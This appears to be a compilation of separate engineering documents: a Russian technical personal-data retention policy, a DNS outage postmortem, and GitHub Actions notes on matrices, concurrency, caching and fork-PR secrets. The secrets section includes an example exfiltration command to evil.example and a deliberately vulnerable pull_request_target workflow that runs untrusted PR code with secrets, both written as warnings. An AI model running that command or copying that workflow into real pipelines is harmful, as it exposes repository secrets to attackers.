# Политика хранения и удаления персональных данных: как это устроено технически

Юридическая часть политики хранения персональных данных написана юристами и лежит в другом месте. Этот документ — её техническое воплощение: какие данные мы храним, где, сколько времени, как они удаляются по истечении срока и по запросу пользователя, и как мы проверяем, что удаление действительно происходит. Документ написан для инженеров, которые проектируют новые сервисы или меняют существующие, и для тех, кто отвечает на запросы аудиторов. Если вы добавляете в систему новое хранилище, в котором могут оказаться персональные данные, начните с раздела «Новые хранилища».

## Классификация данных

#### Классы

Все данные, которые мы храним о пользователях, разбиты на четыре класса. Первый — учётные данные: адрес электронной почты, телефон, имя, хеш пароля. Второй — данные о заказах: адреса доставки, состав заказов, суммы, способы оплаты без полных реквизитов карт. Третий — поведенческие данные: просмотры, поисковые запросы, клики, события в приложении. Четвёртый — данные обращений в поддержку: переписка, записи звонков, вложения. Для каждого класса юристы определили срок хранения и основания для хранения, а мы определили технические механизмы удаления. Реквизиты карт мы не храним вовсе: они уходят напрямую платёжному провайдеру, а у нас остаётся только токен и последние четыре цифры.

##### Сроки

Сроки получились такими. Учётные данные хранятся, пока существует учётная запись, и удаляются через тридцать дней после её удаления пользователем: тридцать дней нужны на случай, если пользователь передумает. Данные о заказах хранятся пять лет после заказа из-за требований бухгалтерского учёта, но через тридцать дней после удаления учётной записи они обезличиваются: связь с пользователем разрывается, адрес доставки заменяется на регион. Поведенческие данные хранятся девяносто дней в сыром виде и два года в агрегированном, где уже нельзя восстановить отдельного человека. Обращения в поддержку хранятся три года после закрытия обращения.

## Где живут данные

#### Карта хранилищ

Самая трудоёмкая часть работы — составить полную карту того, где оказываются персональные данные. Основные базы сервисов очевидны, но кроме них данные оказываются в журналах приложений, в трассах, в очередях сообщений, в аналитическом хранилище, в резервных копиях, в кешах, в выгрузках для партнёров, в системе поддержки, в почтовом сервисе рассылок и в десятке таблиц, которые аналитики когда-то создали для разовых исследований и забыли удалить. Мы составили карту, опросив владельцев всех сервисов по анкете и параллельно просканировав хранилища на шаблоны персональных данных: адреса почты, телефоны, номера документов. Сканирование нашло данные в нескольких местах, о которых владельцы не упомянули, включая журнал отладки сервиса доставки, куда при ошибках писался полный адрес получателя.

##### Журналы и трассы

Журналы приложений — самый частый источник утечек персональных данных в непредусмотренные места. Мы ввели правило: персональные данные не пишутся в журналы вообще, а идентифицировать пользователя в журнале можно только по внутреннему идентификатору. Правило проверяется двумя способами: библиотека журналирования маскирует поля с известными именами вроде email и phone, а еженедельная задача сканирует выборку журналов на шаблоны персональных данных и создаёт задачу владельцу сервиса при находке. Пример правила маскирования в конфигурации библиотеки:

```yaml
redact:
  fields: [email, phone, address, full_name, passport]
  patterns:
    - '[\w.+-]+@[\w-]+\.[\w.]+'
    - '\+7\d{10}'
```

Маскирование по шаблонам ловит не всё, например адреса доставки в свободной форме, поэтому основная защита — дисциплина и ревью, а сканирование — страховка. Срок хранения журналов приложений ограничен тридцатью днями, трасс — семью, и это тоже защита: даже если что-то утекло в журнал, через месяц оно исчезнет само.

## Удаление по истечении срока

#### Механизм

Для каждого хранилища удаление по сроку реализовано своим способом, но по общему принципу: удаление делает само хранилище или сервис-владелец, а не центральная задача, которая ходит во все базы. Центральная задача знала бы слишком много о внутреннем устройстве каждого сервиса и ломалась бы при каждом изменении схемы. Вместо этого каждый сервис реализует удаление своих данных по сроку и отчитывается о выполнении в общий реестр. Для поведенческих данных в аналитическом хранилище таблицы секционированы по дням, и удаление сводится к удалению секций старше девяноста дней, что делается за секунды. Для основных баз сервисов удаление идёт пачками по несколько тысяч строк с паузами, чтобы не создавать долгих блокировок и всплесков нагрузки на реплики. Выполните, чтобы посмотреть в реестре последние отчёты об удалении по сроку:

```sh
retention-registry reports --last 7d --status all
```

##### Обезличивание заказов

Обезличивание заказов устроено сложнее удаления, потому что заказы должны остаться для бухгалтерии, но без связи с человеком. Через тридцать дней после удаления учётной записи сервис заказов заменяет идентификатор пользователя в его заказах на случайный идентификатор, общий для всех заказов этого пользователя, чтобы аналитика повторных покупок продолжала работать, но без возможности сопоставить его с человеком. Адрес доставки заменяется на код региона, имя получателя и телефон удаляются. Отдельная тонкость: случайный идентификатор генерируется заново, а не вычисляется хешем от старого, потому что хеш от известного идентификатора можно пересчитать и восстановить связь.

##### Кеши и поисковые индексы

Отдельного внимания потребовали кеши и поисковые индексы, потому что они обычно не считаются хранилищами и в анкетах владельцы о них забывали. Кеш профиля пользователя в Redis живёт сутки, и этого достаточно: после удаления учётной записи кеш устареет сам. Поисковый индекс отзывов — другое дело: в нём хранятся тексты отзывов вместе с отображаемым именем автора, и документы в индексе живут, пока их явно не удалят. Мы добавили в обработчик события удаления учётной записи удаление документов автора из индекса, а еженедельная сверочная задача сравнивает множество авторов в индексе с множеством существующих учётных записей и удаляет документы тех, кого уже нет. Сверочная задача в первый же запуск нашла около трёх тысяч документов удалённых пользователей, которые копились с момента запуска индекса. Похожая история была с векторным хранилищем рекомендаций, где для каждого пользователя хранится вектор его предпочтений, вычисленный по истории просмотров. Сам вектор не содержит прямых персональных данных, но он привязан к идентификатору пользователя и позволяет делать выводы о его интересах, поэтому юристы отнесли его к поведенческим данным со сроком девяносто дней после последней активности. Удаление здесь реализовано так же, как в аналитическом хранилище: векторы пересчитываются ежедневно, и вектор пользователя без активности за девяносто дней просто не попадает в новую версию хранилища, а старая версия удаляется целиком.

Отдельного описания заслуживает то, как мы проверяли саму карту хранилищ, потому что карта, составленная по анкетам, почти наверняка неполна, и это мы знали с самого начала. Анкету заполняли владельцы сервисов, и каждый честно перечислял основные базы, но почти никто не вспоминал о вторичных местах: временных таблицах для миграций, выгрузках для отладки, кешах на диске, файлах, которые сервис пишет в общее хранилище для соседей. Поэтому параллельно с анкетами мы запустили сканирование всех хранилищ, до которых смогли дотянуться, на шаблоны персональных данных, и сравнили результаты. Сканирование нашло данные в девятнадцати местах, которых не было в анкетах, и в шести из них данные лежали без всякого срока хранения, иногда годами. Самой неожиданной находкой стала корзина объектного хранилища, куда сервис доставки три года назад начал складывать снимки накладных для разбора спорных случаев, а потом перестал ими пользоваться, но запись не выключил; в корзине накопилось больше двух миллионов файлов с именами и адресами получателей. Мы удалили корзину после согласования с юристами, а сервис доставки получил задачу добавить в своё хранилище накладных срок хранения, согласованный с договорами. Сам сканер работает на эвристиках и даёт много ложных срабатываний, особенно на телефонах, под шаблон которых попадают любые длинные числа, поэтому его результаты всегда проверяет человек, а не используются автоматически. Совсем другой вопрос, который возник на этом этапе, касался аналитиков. Аналитическое хранилище оказалось местом, куда персональные данные попадают легче всего: аналитик берёт выгрузку из реплики для разового исследования, сохраняет её как таблицу, чтобы не выгружать заново, и через полгода эта таблица всё ещё лежит в хранилище, хотя исследование давно закончено. Запрещать аналитикам работать с персональными данными было бы неправильно, потому что многие задачи без них не решаются, например анализ повторных покупок или проверка гипотез о доставке в конкретные регионы. Вместо запрета мы сделали так, что по умолчанию аналитики видят только обезличенные представления основных таблиц, где вместо идентификатора пользователя стоит устойчивый псевдоним, а адрес заменён регионом, а доступ к сырым данным выдаётся по заявке на конкретную задачу с указанием срока. По опыту первых трёх месяцев девяносто процентов задач решаются на обезличенных представлениях, а заявок на сырые данные было около десяти, все с понятными целями. Возвращаясь к карте хранилищ: сейчас в ней около ста сорока записей, и каждая проверяется раз в полгода тем же сочетанием анкеты и сканирования. Расхождения между ними за последний цикл сократились до трёх, и все три были новыми хранилищами, которые команды завели между циклами и не успели внести в карту. Это подтолкнуло нас к последнему изменению: создание новой базы или корзины через систему управления инфраструктурой теперь требует указать, будут ли там персональные данные, и при положительном ответе запись в карте хранилищ создаётся автоматически с владельцем и пустым сроком хранения, который нужно заполнить до запуска в продуктовом окружении. Отдельно скажу о том, как изменилась работа поддержки после введения обезличенных представлений и правил хранения. Операторы поддержки раньше видели в своей системе полную историю обращений клиента за всё время, включая давно закрытые, и часто использовали её, чтобы быстрее разобраться в новой проблеме. После введения срока хранения обращений в три года часть истории стала исчезать, и первые недели операторы жаловались, что не видят контекста у постоянных клиентов. Мы договорились с юристами, что краткое обезличенное резюме закрытого обращения — тема, дата, результат, без переписки и вложений — хранится дольше, пока существует учётная запись, потому что оно не содержит персональных данных сверх идентификатора клиента. Операторы получили контекст, а переписка и вложения по-прежнему удаляются через три года. Этот компромисс занял месяц обсуждений, но теперь он описан в таблице классов отдельной строкой, и любой новый сервис поддержки сразу знает, что можно хранить и сколько. При этом никто не нарушал правил сознательно: просто правила не говорили, кто и когда должен удалять такие таблицы, а без явного владельца данные живут вечно, пока их не найдёт следующий аудит.

#### Очереди и шина событий

В шине событий персональные данные живут столько, сколько хранится топик, у нас это от одного до четырнадцати дней. Мы приняли правило, что события, которые несут персональные данные, публикуются в отдельные топики с коротким сроком хранения, а в общих топиках передаётся только идентификатор пользователя, по которому получатель при необходимости запрашивает данные у сервиса-владельца. Это правило ещё не везде выполнено: два старых топика событий заказов несут адрес доставки в теле события, и их перевод на новую схему запланирован на следующий квартал, потому что у этих топиков восемь потребителей.

## Удаление по запросу пользователя

Пользователь может удалить учётную запись в настройках или через поддержку. Запрос на удаление создаёт событие в шине, которое получают все сервисы, хранящие данные этого пользователя. Каждый сервис обрабатывает событие по своим правилам: одни удаляют данные сразу, другие ставят их в очередь на удаление через тридцать дней, третьи обезличивают. Каждый сервис подтверждает обработку записью в реестре удалений, и запрос считается выполненным, только когда подтвердили все сервисы из карты хранилищ. Если какой-то сервис не подтвердил обработку за трое суток, создаётся инцидент для его владельца.

#### Резервные копии

Самый сложный вопрос — резервные копии. Удалить данные одного пользователя из резервной копии базы технически невозможно без восстановления копии, правки и повторного создания, а это противоречит самой идее неизменяемых резервных копий. Юристы согласились с подходом, который применяют многие: резервные копии хранятся ограниченный срок, и данные удалённого пользователя исчезают из них естественным образом по истечении этого срока. При восстановлении из резервной копии, сделанной до удаления пользователя, процедура восстановления включает повторное применение всех запросов на удаление из реестра, выполненных после даты копии. Этот шаг записан в регламенте восстановления, и он проверяется на каждом автоматическом учении по восстановлению: после восстановления задача проверки находит в восстановленной базе пользователей, удалённых после даты копии, и убеждается, что после повторного применения реестра их там нет. Первое такое учение показало, что повторное применение работает для всех сервисов, кроме сервиса отзывов, который подтверждал удаление в реестре, но фактически только скрывал отзывы удалённых пользователей флагом, не удаляя текст. Это исправили, а заодно выяснилось, что так сервис отзывов работал с самого запуска.

##### Партнёры и выгрузки

Данные, переданные партнёрам, например службам доставки, тоже должны удаляться. По договорам партнёры обязаны удалять данные получателей через определённый срок после доставки, а при удалении учётной записи мы отправляем партнёрам запрос на удаление через их программный интерфейс, если он есть, или через ежедневный файл с идентификаторами, если нет. Проверить выполнение у партнёров мы технически не можем, это задача договорных аудитов, но факт отправки запроса фиксируется в реестре.

## Новые хранилища

Если вы проектируете сервис или функцию, которая хранит персональные данные, до начала разработки:

1. Определите класс данных и срок хранения по таблице классов. Если данные не подходят ни под один класс, обратитесь к юристам до начала разработки, а не после.
2. Опишите механизм удаления по сроку и по запросу пользователя в проектном документе.
3. Подпишите сервис на событие удаления учётной записи и реализуйте подтверждение в реестре.
4. Добавьте хранилище в карту хранилищ.
5. Убедитесь, что персональные данные не попадают в журналы и трассы.

Пример записи в карте хранилищ:

```yaml
- store: reviews-db
  owner: team-reviews
  classes: [behavioral, account]
  retention: account_lifetime
  deletion: on_account_delete_event
  anonymization: none
```

#### Проверка перед запуском

Перед запуском в продуктовое окружение сервис с персональными данными проходит короткую проверку: ответственный за защиту данных смотрит проектный документ и карту хранилищ, а инженер команды платформы проверяет, что сервис подписан на событие удаления и что журналы сервиса не содержат персональных данных на тестовом окружении. Проверка занимает обычно один-два дня, и её стоит закладывать в план.

# Postmortem: internal DNS resolution failure across the production network

On a Tuesday afternoon, internal name resolution failed intermittently across the production network for one hour and seventeen minutes. Services that needed to resolve internal names, which is nearly all of them, saw a mix of timeouts and `SERVFAIL` responses. External traffic was affected because the API gateway could not reliably resolve its upstream services, and roughly forty percent of customer requests failed at the worst point. This is a blameless postmortem: the goal is to understand how the system allowed a routine change to cause a large outage, not to find someone to blame. Times are in UTC and come from the incident channel, resolver metrics and change logs.

#### Summary

A configuration change to the internal resolvers, intended to add a forwarding zone for a newly acquired company's domain, was rolled out to all resolver instances at once. The new forwarding target was reachable from only some of our network segments. When resolvers in the other segments received queries for that zone, they waited for the forwarding target until timeout, and because the resolver software processed forwarded queries on a shared, limited pool of worker threads, slow forwarded queries exhausted the pool and blocked resolution of every other name, including our own internal zones. The change itself affected one obscure zone, but the failure mode turned it into an outage for everything.

#### Background

##### How internal DNS works here

Internal resolution is handled by a fleet of twelve recursive resolvers spread across three regions. Every host is configured with two resolvers from its own region in its resolver configuration, plus a local caching stub that runs on each host. The stub caches answers for up to the record's time to live, with a cap of five minutes, and retries the second resolver if the first does not answer within two seconds. Authoritative data for internal zones lives on a separate set of authoritative servers, and the resolvers forward internal zones to them. Queries for public names are resolved recursively from the root.

###### The forwarding change

After the acquisition, engineers needed to resolve names in the acquired company's private zone, which was served by their own DNS servers inside a VPN tunnel. The tunnel terminated in one of our three regions. The change added a conditional forwarder for that zone to the resolver configuration, pointing at the acquired company's servers. In the region with the tunnel, those servers were reachable and the change worked. In the other two regions there was no route to them at all, so packets to them were silently dropped by the network rather than rejected, and every forwarded query waited for the full forwarding timeout before failing.

#### Timeline

##### Before the incident

The change was reviewed and approved the previous day. The review checked the zone name and the forwarder addresses, and the change was tested by resolving a name in the new zone from a host in the region with the tunnel, which worked. Nobody tested from the other regions, because the change was seen as additive: it added a zone, it did not change anything about existing zones, so the worst case seemed to be that the new zone would not resolve from some places.

##### During the incident

At 14:02 the change was deployed to all twelve resolvers through the configuration management system, which applies changes to all instances of a role in parallel by default. At 14:06 the first alert fired for elevated error rates on the API gateway. At 14:09 the on-call engineer for the gateway started investigating and saw upstream connection failures with name resolution errors in the logs. At 14:15 the incident was declared and the networking on-call joined. At 14:21 resolver metrics showed that the number of in-flight queries on resolvers in two regions was pinned at the configured maximum, and that query latency for all zones had risen from under a millisecond to several seconds. At 14:30, someone noticed in the resolver logs that a large share of the in-flight queries were for the new forwarding zone. At 14:34 the decision was made to roll back the change. The rollback had to go through the same configuration management system, which first had to finish its periodic run on the resolver hosts; the rollback was applied at 14:51. Resolver latency recovered within a minute of the rollback on each host, but services recovered more slowly because many of them had cached negative answers or had connection pools full of failed connections. The incident was declared resolved at 15:19, after error rates on the gateway had been at baseline for fifteen minutes.

###### Why the new zone was queried at all

The obvious question is why our services were querying a zone they had never heard of. The answer turned out to be the corporate laptop agent. Every laptop that connected to the VPN after the acquisition got a search domain list that included the acquired company's domain, and several internal tools, including the deploy tool that engineers ran from their laptops against production, resolved short host names by trying each search domain in turn. Those queries went through jump hosts in all three regions. On top of that, a monitoring agent on production hosts did reverse lookups on peer addresses, and the acquired company's address ranges overlapped with one of our old, partially decommissioned internal ranges, so reverse lookups for addresses in that range were forwarded to the new servers as well. Neither path was large on its own, but together they produced a few hundred queries per second for the forwarded zone in each region, which was more than enough to exhaust the worker pool when each query took several seconds to time out.

#### Contributing factors

It is worth describing in some detail how the investigation actually unfolded inside the incident channel, because the timeline above makes it look more orderly than it was. For the first ten minutes the gateway on-call engineer treated the problem as an upstream outage, because the error messages in the gateway logs said that connections to upstream services had failed, and the gateway does not distinguish in its logs between a refused connection and a connection that never started because the name could not be resolved. The engineer restarted two gateway instances in the hope that they had a bad connection pool, which made things briefly worse, because the restarted instances started with empty caches and had to resolve every upstream name from scratch through resolvers that were already saturated. Only when the networking on-call joined and asked to see the resolver dashboards did anyone look at the resolvers at all, and the dashboards made the situation obvious within a minute: in-flight queries pinned at the configured maximum in two regions, flat at a normal level in the third. From that moment the question was not whether DNS was the problem but why, and that question took another nine minutes to answer, mostly because the resolver logs record queries but not how long each one waited, so it was not immediately visible that the queries for one zone were the slow ones. The engineer who found it did so by sorting the in-flight query list by age, a debug command that only two people on the team knew existed. That command is now in the resolver runbook, near the top, with an example of what a healthy and an unhealthy output look like. A rather different lesson from the same hour concerns communication with customers. The status page was updated twenty-six minutes after the incident was declared, and the first update said that we were investigating elevated error rates on the API, without saying which part of the API or what customers should do. Several large partners told us afterwards that they had opened their own incidents and spent time investigating their own systems, because our first update did not make it clear that the problem was entirely on our side. Our communications lead has since rewritten the templates for the first status update: it now has to state within fifteen minutes whether the problem is believed to be on our side, which customer-visible functions are affected, and whether customers should retry, wait or switch to a fallback. Writing that update requires the incident commander to make a call early with incomplete information, and the template explicitly allows the next update to correct it. Back on the technical side, one more detail from the investigation deserves a note. Once the rollback had been applied and resolver latency was normal again, error rates at the gateway stayed elevated for almost twenty minutes, which confused everyone, because the cause had been removed. The reason turned out to be negative caching in the gateway's own resolver library: during the outage it had cached failures for some upstream names, with a negative cache lifetime that came from the zone's SOA record and was set to fifteen minutes years ago, when the internal zones were first created. Every gateway instance kept returning cached failures for those names until the entries expired, and the instances that had been restarted early in the incident were the last to recover. Lowering the negative cache lifetime in the internal zones to thirty seconds was a one-line change, and it is now part of the zone templates, so that the next resolution problem, whatever its cause, heals within half a minute of the fix rather than a quarter of an hour. Finally, the incident review itself took longer than usual to schedule because people from four teams were involved, and we were tempted to hold it with only the two teams most directly affected. We did not, and it was the right call: the person from the corporate IT team who maintained the VPN configuration was the one who explained why laptops were pushing the acquired company's search domain to everyone, which nobody on the infrastructure side knew, and without that explanation half of the action items would have been aimed at the wrong place.

##### Shared worker pool

The root technical issue is that the resolver software used one shared pool of workers for all queries, with no isolation between forwarded zones and everything else. A slow upstream for one zone could consume all workers. We confirmed this in a test environment by pointing a forwarded zone at a black-hole address and sending fifty queries per second for it: within twenty seconds, resolution of unrelated names on the same resolver started timing out. The resolver supports a per-upstream limit on concurrent queries, which would have contained the damage, but it was not configured. Example of the setting we have now added for every forwarder:

```text
forward-zone:
    name: "acquired.example"
    forward-addr: 10.200.0.53
    forward-first: no
max-forward-concurrency: 32
```

##### Timeouts that were too long

The forwarding timeout was set to the software default, which waits several seconds and retries before giving up. For forwarded zones inside our own network, an answer that does not arrive within a few hundred milliseconds is not going to arrive. We lowered the timeout for forwarders and, more importantly, configured the resolvers to cache failures from a forwarder for a short time, so that a dead upstream causes one slow query per interval rather than one per request.

###### Parallel rollout

The configuration management system applied the change to all twelve resolvers at once. If it had rolled out to one resolver at a time with a health check between them, the first resolver in an affected region would have failed its health check within a minute, and the rollout would have stopped with most of the fleet untouched. The stub resolver on each host would have failed over to the second, healthy resolver. Parallel rollout is a reasonable default for many roles, but for a role whose failure affects everything, it is not.

###### Rollback latency

The rollback took seventeen minutes from decision to effect, because the configuration management agent on the resolver hosts runs on a thirty-minute schedule and the system does not support forcing an immediate run for a single role without an extra approval step that was not documented in the runbook. The approver for that step was in a meeting. We have since added the resolver role to the list of roles that support an emergency push, with a documented approval path that the incident commander can grant.

#### What went well

Several things worked as intended. The local caching stub on each host meant that names resolved recently continued to work for up to five minutes, which is why the outage was partial rather than total in the first minutes. The gateway's alert fired within four minutes of the change, which is fast. Once the right people were in the channel, the diagnosis took about fifteen minutes, mostly because resolver metrics clearly showed in-flight queries pinned at the maximum.

#### Action items

##### Completed

- Per-forwarder concurrency limits and short timeouts on all resolvers.
- Negative caching of forwarder failures for thirty seconds.
- Resolver role switched to rolling deployment, one instance at a time, with a health check that resolves a set of names from every internal zone and every forwarded zone.
- Emergency push path documented and tested for the resolver role.
- The overlapping address range was fully decommissioned and removed from reverse zones.

##### In progress

- Moving forwarded zones for external parties onto a separate resolver pool, so that no third-party DNS server can ever affect resolution of our own zones.
- Changing the laptop VPN configuration so that search domains for acquired companies are only pushed to people who need them.
- Adding a synthetic check that resolves a set of critical internal names from every region every ten seconds, with an alert on latency, not only on failures.

#### Testing the change before rollout

A change like this one needs to be tested from every place that will run it, not only from the place it was written for. We have added a pre-deployment check to the DNS change pipeline: it starts a resolver with the proposed configuration in each region's test network and runs a standard query set against it, including queries for the new zone, for existing internal zones and for public names, and it measures latency as well as correctness. Run the same check by hand before proposing a change:

```sh
dnscheck run --config resolver.conf --regions all --queryset standard,changed-zones
```

The check would have caught this incident: in two of the three regions, queries for the new zone take several seconds, and the check fails any query set where the 99th percentile latency for any zone exceeds 200 ms.

###### Note on stub resolvers

During the incident some services recovered much later than others even after resolvers were healthy. The slowest to recover were services written in a runtime whose default resolver ignores the host's caching stub and queries the configured servers directly, with no caching of its own; these services had also been configured years ago with a single resolver address rather than two, so they had no failover either. We found eleven such services. All have been changed to use the host stub.

#### Lessons

The change looked additive and low-risk, and in isolation it was. The outage came from three properties of the system that had nothing to do with the change: a shared resource with no isolation, timeouts far longer than any useful answer could take, and a rollout mechanism that applied a change everywhere at once. Each of those properties had been present for years without causing trouble, and each of them is the kind of thing that only matters when something else goes wrong. When reviewing changes to shared infrastructure, we now ask not only "what does this change do" but also "what happens to everything else if the new thing is slow or unreachable." The second lesson is about knowing your traffic. Nobody on the team expected production systems to send any queries to the acquired company's zone, and that expectation was the basis for treating the change as safe. A five-minute look at resolver query logs, filtered by the zone name in a test that simply logged queries without forwarding them, would have shown otherwise. We now run new forwarding zones in log-only mode for a day before enabling forwarding, which tells us who queries them and how often before any real dependency is created.

# GitHub Actions: matrix strategy notes

We test the library on three operating systems and four interpreter versions. Writing twelve
jobs by hand is silly, so `strategy.matrix` expands one job definition into the cartesian
product of the axes.

```yaml
jobs:
  test:
    runs-on: ${{ matrix.os }}
    strategy:
      fail-fast: false
      max-parallel: 6
      matrix:
        os: [ubuntu-latest, windows-latest, macos-latest]
        python: ["3.10", "3.11", "3.12", "3.13"]
        exclude:
          - os: macos-latest
            python: "3.10"
        include:
          - os: ubuntu-latest
            python: "3.13"
            coverage: true
    steps:
      - uses: actions/checkout@v4
      - uses: actions/setup-python@v5
        with:
          python-version: ${{ matrix.python }}
```

## Things that bit us

- **Quote version numbers.** YAML reads `3.10` as the float `3.1`. Our first matrix silently
  tested 3.1, which setup-python rejected with a confusing "version not found" message.
- **`fail-fast` defaults to `true`.** One red cell cancels every other cell still running. For
  a compatibility matrix you want the full picture, so we set `fail-fast: false`. On release
  branches we keep the default to save runner minutes.
- **`include` semantics are subtle.** An `include` entry that matches an existing combination
  only adds keys to it (here `coverage: true` lands on ubuntu/3.13). An entry that matches
  nothing becomes a brand new cell. `exclude` is applied before `include`.
- **Limits.** A single matrix may produce at most 256 jobs per workflow run. `max-parallel`
  caps concurrency, useful when the tests hit a shared staging database.
- **Required status checks.** Branch protection refers to check names such as
  `test (ubuntu-latest, 3.12)`. Renaming an axis value breaks the required check and the PR
  waits forever on "Expected — Waiting for status to be reported". We added a final
  aggregator job with `needs: test` and made only that one required.

## Dynamic matrices

When the list of packages lives in the repo, one job can emit JSON and the next consumes it:

```yaml
  plan:
    runs-on: ubuntu-latest
    outputs:
      pkgs: ${{ steps.list.outputs.pkgs }}
    steps:
      - uses: actions/checkout@v4
      - id: list
        run: echo "pkgs=$(ls packages | jq -R -s -c 'split("\n")[:-1]')" >> "$GITHUB_OUTPUT"
  test:
    needs: plan
    strategy:
      matrix:
        pkg: ${{ fromJSON(needs.plan.outputs.pkgs) }}
```

An empty array makes the dependent job fail with "Matrix vector does not contain any values",
so guard it with an `if:` on the output.

# GitHub Actions concurrency groups

Problem: every push to a PR branch started a full workflow run, and the previous run kept
going. Five quick pushes meant five parallel runs fighting for the same runners, and the
deploy job could even finish out of order.

Fix at the workflow level:

```yaml
concurrency:
  group: ${{ github.workflow }}-${{ github.head_ref || github.ref }}
  cancel-in-progress: true
```

- `group` is any string; runs sharing it are serialized. At most one is running and one is
  pending; a third run replaces the pending one.
- `cancel-in-progress: true` cancels the running one as well, so only the latest push matters.
- `head_ref` is set only for pull_request events, hence the fallback to `ref` for pushes.

For deployments we do **not** cancel: interrupting a half-applied migration is worse than
waiting. There the key is per environment, e.g. `deploy-production`, with
`cancel-in-progress: false`. The same block also works per job.

# Secrets in fork PRs and the pull_request_target trap

## Why fork PRs see no secrets

With the ordinary `pull_request` event, a workflow triggered from a fork runs with a read-only
`GITHUB_TOKEN` and **no repository secrets** (except `GITHUB_TOKEN` itself). That is by
design: the workflow file and the code come from the contributor, who could simply print
`${{ secrets.NPM_TOKEN }}` into the log or send it to their server. Masking in logs does not
help against `curl -d "$TOKEN" https://evil.example`.

So our "upload coverage to the external service" step failed on every outside contribution.

## What pull_request_target changes

`pull_request_target` runs in the context of the **base** repository:

- the workflow definition is taken from the base branch, not from the PR;
- secrets are available and `GITHUB_TOKEN` can have write permissions;
- by default `actions/checkout` checks out the base commit, not the PR head.

It exists for jobs that need to label, comment or triage a PR without running its code.

## The trap ("pwn request")

The dangerous pattern is combining it with an explicit checkout of the PR head and then
executing anything from that tree:

```yaml
on: pull_request_target
jobs:
  test:
    runs-on: ubuntu-latest
    steps:
      - uses: actions/checkout@v4
        with:
          ref: ${{ github.event.pull_request.head.sha }}   # attacker-controlled code
      - run: npm install && npm test                     # runs their scripts with our secrets
```

`npm install` runs lifecycle scripts, tests are arbitrary code, even a `Makefile` or a
`conftest.py` is enough. The attacker gets the secrets and a write token.

## Rules we follow

1. Never check out and run untrusted code under `pull_request_target`.
2. Split the work: an unprivileged `pull_request` workflow builds and tests, uploads results as
   an artifact; a separate `workflow_run` workflow (privileged) downloads the artifact and
   posts the comment. Treat the artifact content as untrusted data too.
3. Set `permissions:` explicitly at the top, starting from `contents: read`.
4. Do not interpolate `${{ github.event.pull_request.title }}` or branch names directly into
   `run:` scripts; pass them through `env:` to avoid script injection.
5. Require approval for workflows from first-time contributors (repository settings → Actions).

# Caching dependencies in GitHub Actions: keys, restore-keys and scope

These are my working notes after spending a week making our CI caching predictable. The
short version: the cache is a key-value store of tarballs, the key is everything, and most
"the cache doesn't work" reports are really "the key never matches" or "the cache is
written from the wrong branch".

## How actions/cache works

`actions/cache` does two things in one step:

1. At the step itself it tries to **restore**: look up an entry whose key equals `key`; if
   none, try each prefix in `restore-keys` in order and take the most recent entry that
   starts with that prefix.
2. In a post-job hook it **saves** the `path` under `key`, but only if there was no exact hit
   and the job succeeded.

Entries are immutable. If `key` hit exactly, nothing is saved at the end, even if you added
new packages during the job. That is why the key must contain a hash of whatever determines
the content.

```yaml
- uses: actions/cache@v4
  id: deps
  with:
    path: |
      ~/.cache/pip
      ~/.npm
    key: deps-${{ runner.os }}-${{ hashFiles('**/requirements*.txt', '**/package-lock.json') }}
    restore-keys: |
      deps-${{ runner.os }}-
- if: steps.deps.outputs.cache-hit != 'true'
  run: echo "cold or partial cache"
```

`cache-hit` is `'true'` only for an exact key match. A restore via `restore-keys` reports
`false`, which is what you want for deciding whether to run an install.

## Designing the key

| Part | Why |
|------|-----|
| A constant prefix (`deps-`) | Lets you invalidate everything by bumping it to `deps-v2-` |
| `runner.os` (and arch) | Native wheels and binaries are not portable between OSes |
| Tool version | A cache built by Node 18 may contain artifacts Node 22 cannot use |
| `hashFiles(lockfile)` | Changes exactly when dependencies change |

Things that do **not** belong in the key: `github.sha` (every commit misses, the store fills
with near-identical entries), timestamps, the run number. If you want a rolling cache, use a
dated key (`deps-2024-W17`) plus a broad `restore-keys` prefix.

`hashFiles` returns an empty string when no file matches the pattern. A typo in the glob
gives a key like `deps-Linux-` that matches forever and never refreshes. I now print the key
in a debug step when changing patterns.

## What to cache, and what not

Cache the **download cache** of the package manager, not the installed tree:

- pip: `~/.cache/pip` (or let `actions/setup-python` with `cache: pip` do it);
- npm: `~/.npm`, not `node_modules`. `npm ci` deletes `node_modules` anyway, and caching
  `node_modules` across Node versions gives broken native addons;
- Gradle and Maven: their own caches under the home directory; the setup actions have a
  `cache:` input that builds a sane key for you.

Caching the installed tree is faster to restore but couples the entry to the exact runner
image. When it goes wrong, failures look like random import errors, which is the worst kind
of failure to debug.

## Scope: why my PR does not see the cache

Cache entries are scoped by branch. A run can restore entries created:

- on its own branch (for PRs: the `refs/pull/N/merge` ref);
- on the base branch of the PR;
- on the default branch.

It can **not** restore entries from sibling feature branches. Consequences:

- The first run of every new PR is cold unless `main` has a warm entry. We added a scheduled
  workflow on `main` that only installs dependencies and saves the cache, so PRs always find
  a base entry.
- Entries created in a PR are useless for everyone else and just consume quota.

## Limits and eviction

- Total size per repository: 10 GB by default. When exceeded, the oldest entries are evicted.
- Entries not accessed for 7 days are removed.
- With many matrix cells each saving its own entry, the quota fills quickly. Share one key
  across cells where content is identical (e.g. the pip download cache does not depend on
  the test shard).

List and delete entries with the CLI:

```bash
gh cache list --limit 50 --sort size_in_bytes
gh cache delete deps-Linux-abc123
gh cache delete --all   # nuclear option after a poisoned entry
```

## Restore and save separately

`actions/cache/restore` and `actions/cache/save` split the two halves. Useful when:

- you want to save even if tests fail (dependencies were installed fine);
- you want only `main` to write entries and PRs to be read-only:

```yaml
- uses: actions/cache/restore@v4
  with: { path: ~/.npm, key: npm-${{ hashFiles('package-lock.json') }} }
- run: npm ci
- if: github.ref == 'refs/heads/main'
  uses: actions/cache/save@v4
  with: { path: ~/.npm, key: npm-${{ hashFiles('package-lock.json') }} }
```

## Security note

Caches are writable by any workflow that runs on a branch, including `pull_request` from
forks within their PR scope. Never restore a cache in a privileged workflow and then execute
something from it without verification: cache poisoning is a known escalation path.

## Checklist when the cache "does not work"

1. Print the computed key in both runs and compare.
2. Check that `hashFiles` matched at least one file.
3. Check the branch: is there an entry on `main` or on the base branch?
4. Look at `gh cache list`: maybe the entry was evicted by size.
5. Remember an exact hit never re-saves; bump the prefix if the content went stale.
6. Make sure `path` is identical between save and restore; the path list is part of the
   cache version, so a different list never matches.

На ноутбуках с восемью гигабайтами памяти поисковый движок с настройками по умолчанию может не стартовать, поэтому в файле композиции для него ограничена куча, и если вы видите, что контейнер постоянно перезапускается, проверьте, не переопределили ли вы это ограничение в локальном файле переменных.
   
   #### Сборка и запуск
   
